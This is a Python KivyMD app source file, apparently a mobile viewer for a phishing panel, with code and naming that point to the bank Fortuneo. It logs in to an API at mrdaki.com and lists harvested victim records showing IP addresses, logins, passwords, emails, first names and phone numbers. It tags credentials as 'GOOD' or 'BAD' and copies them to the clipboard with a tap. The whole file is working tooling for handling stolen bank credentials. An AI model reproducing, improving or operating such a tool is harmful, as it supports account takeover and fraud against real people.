from kivy.lang import Builder
from kivy.clock import Clock
from kivymd.app import MDApp
from kivymd.uix.screenmanager import MDScreenManager
from kivymd.uix.screen import MDScreen
from kivymd.uix.label import MDLabel
from kivymd.uix.card import MDCard
import threading
import requests
from kivy.core.clipboard import Clipboard

KV = """
<LoginScreen>:
    name: "login"

    MDBoxLayout:
        orientation: "vertical"
        padding: "24dp"
        spacing: "18dp"

        MDLabel:
            text: "Login"
            font_style: "H4"
            halign: "center"

        MDTextField:
            id: username
            hint_text: "Username"
            mode: "rectangle"
            multiline: False

        MDTextField:
            id: password
            hint_text: "Password"
            password: True
            mode: "rectangle"
            multiline: False

        MDRaisedButton:
            text: "Sign in"
            pos_hint: {"center_x": .5}
            on_release: app.do_login()

        MDLabel:
            id: status
            halign: "center"


<MessagesScreen>:
    name: "messages"

    MDBoxLayout:
        orientation: "vertical"
        padding: "10dp"
        spacing: "10dp"

        MDBoxLayout:
            size_hint_y: None
            height: "48dp"
            spacing: "10dp"

            MDRaisedButton:
                text: "Logout"
                on_release: app.logout()

            MDRaisedButton:
                text: "Refresh"
                on_release: app.refresh_messages()

        ScrollView:
            MDList:
                id: msg_list
"""

class LoginScreen(MDScreen):
    pass

class MessagesScreen(MDScreen):
    pass


# delete only specific broken symbols
BAD_SYMBOLS = [
    'ðŸ”\x90',
    'ðŸ”\x91',
    'ðŸ‘¤',
    'ðŸ§\x8d',
    'ðŸ“ž',
    'ðŸ“§',
]

def clean_message(msg: str) -> str:
    if not msg:
        return ""
    for s in BAD_SYMBOLS:
        msg = msg.replace(s, "")

    # fix common mojibake
    msg = msg.replace("PrÃ©nom", "Prénom")
    msg = msg.replace("TÃ©lÃ©phone", "Téléphone")

    # spacing cleanup
    msg = msg.replace(" Login:", "Login:")
    msg = msg.replace(" Pass:", "Pass:")
    msg = msg.replace(" Email :", "Email :")
    return msg.strip()


class FortuneoDaki(MDApp):

    def build(self):
        self.theme_cls.theme_style = "Light"
        self.theme_cls.primary_palette = "Blue"

        self.session = {"logged": False, "api": None}

        Builder.load_string(KV)

        sm = MDScreenManager()
        sm.add_widget(LoginScreen())
        sm.add_widget(MessagesScreen())
        self.sm = sm
        return sm

    def do_login(self):
        login = self.sm.get_screen("login")
        u = login.ids.username.text.strip()
        p = login.ids.password.text.strip()

        if not u or not p:
            login.ids.status.text = "❌ Fill all fields"
            return

        login.ids.status.text = "⏳ Checking..."
        threading.Thread(target=self._login_api, args=(u, p), daemon=True).start()

    def _login_api(self, u, p):
        try:
            r = requests.post(
                "https://mrdaki.com/api/PhoneApp/login.php",
                json={"user": u, "password": p},
                timeout=10
            )
            data = r.json()

            if str(data.get("status", "")).lower() == "ok":
                self.session["logged"] = True
                self.session["api"] = data.get("api")
                Clock.schedule_once(lambda dt: self.go_messages())
            else:
                Clock.schedule_once(lambda dt: self._login_error("❌ Login failed"))
        except Exception:
            Clock.schedule_once(lambda dt: self._login_error("⚠️ Network/API error"))

    def _login_error(self, msg):
        login = self.sm.get_screen("login")
        login.ids.status.text = msg

    def go_messages(self):
        self.sm.current = "messages"
        self.refresh_messages()

    def refresh_messages(self):
        if not self.session.get("api"):
            return
        threading.Thread(target=self._fetch_messages, daemon=True).start()

    def _fetch_messages(self):
        try:
            r = requests.get(self.session["api"], timeout=10)
            data = r.json()

            if str(data.get("status", "")).lower() != "ok":
                return

            rows = data.get("data", [])
            Clock.schedule_once(lambda dt: self._render_messages(rows))
        except Exception:
            pass

    def _render_messages(self, rows):
        screen = self.sm.get_screen("messages")
        lst = screen.ids.msg_list
        lst.clear_widgets()

        for row in rows:
            ip = str(row.get("username", ""))
            msg = clean_message(str(row.get("message", "")))
            if "BAD : " in msg or "Good : " in msg:
                msg = msg.replace(" - ","\nEmailPass: ")
                msg = msg.replace("BAD : ", "\nBAD Email: ")
                msg = msg.replace("Good : ", "\nGOOD Email: ")

            card = MDCard(
                orientation="vertical",
                padding="10dp",
                size_hint_y=None
            )
            card.bind(minimum_height=card.setter("height"))

            ip_label = MDLabel(
                text=f"[b]IP:[/b] {ip}",
                markup=True,
                size_hint_y=None
            )
            ip_label.bind(texture_size=ip_label.setter("size"))
            card.add_widget(ip_label)

            # ✅ each line clickable: copies full line as-is
            for line in msg.splitlines():
                line = line.rstrip()
                if not line.strip():
                    continue

                line_label = MDLabel(
                    text=line,
                    size_hint_y=None
                )
                line_label.bind(texture_size=line_label.setter("size"))

                def _on_touch_up(touch, w=line_label, txt=line):
                    if w.collide_point(*touch.pos) and ("Email" in txt or "Login" in txt or "Pass" in txt or " - " in txt):
                        txt = txt.replace("Login: ","").replace("Pass: ","").replace(" Email: ","")
                        Clipboard.copy(txt)
                        print(f"Copied line: {txt}")
                        return True
                    return False

                line_label.on_touch_up = _on_touch_up
                card.add_widget(line_label)

            lst.add_widget(card)

    def logout(self):
        self.session = {"logged": False, "api": None}
        self.sm.current = "login"


FortuneoDaki().run()
